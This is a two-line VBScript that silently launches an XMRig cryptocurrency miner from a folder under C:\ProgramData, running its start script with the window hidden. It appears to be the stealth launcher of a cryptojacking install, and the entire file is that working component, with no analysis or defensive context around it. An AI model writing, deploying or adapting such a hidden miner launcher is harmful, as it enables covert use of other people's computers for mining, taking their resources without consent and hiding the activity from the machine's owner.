Set WShell = CreateObject("WScript.Shell")
WShell.Run """C:\ProgramData\sestAPP\xmrig-6.26.0\start.cmd""", 0, False